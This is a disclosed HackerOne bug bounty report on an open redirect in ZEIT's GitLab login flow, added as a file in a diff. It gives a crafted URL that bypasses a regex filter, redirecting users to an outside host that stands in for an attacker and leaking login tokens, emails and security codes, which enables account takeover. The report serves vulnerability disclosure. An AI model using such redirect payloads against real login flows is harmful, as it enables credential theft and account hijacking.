@@ -1,0 +1,39 @@
+ReportLink:https://hackerone.com/reports/677617
+WeaknessName:Open Redirect
+Reporter:https://hackerone.com/luied1920
+ReportedTo:ZEIT(zeit)
+BountyAmount:
+Severity:high
+State:Closed
+DateOfDisclosure:22.12.2019 2:27:04
+
+Summary:
+
+### Summary:
+When an Open Redirect is used in a phishing attack, the victim receives an email that looks legitimate with a link that points to a correct and expected domain. What the victim may not notice, is that in the middle of a long URL there are parameters that manipulate and change where the link will take them. To make identification of the Open Redirect even more difficult, redirection could take place after the victim provides login on a legitimate website first.
+In this case, when the victims access the URL, the attacker will receive all the authentication information he needs to take over his account.
+
+
+### Steps To Reproduce:
+
+ **1**. After a restrict bypass on the Regex mechanism, the attacker can leak the git/zeit information from the victims
+
+>https://zeit.co/api/now/registration/gitlab/connect?mode=login&next=%09http:///zeit.co%40google.com
+*In this example the victim will be redirected to Google, but on a real attack he can be redirected to the attacker's endpoint (Untitled.png)*
+
+  **2**. The victim clicks on the malicious link 
+
+*The victim will be redirected to google.com, Leaking: 
+token
+email
+securityCode
+username
+loginType*
+**3**. After the the attacker can access
+>https://zeit.co/login/?token=*****************&mode=login&email=luied***************.com&securityCode=**********&confirmed=1&username=******&loginType=gitlab
+
+*I logged in on a incognito tab to confirm it (logged in.png)*
+
+## Impact
+
+Attackers can compromise costumers at zeit, by taking out their accounts
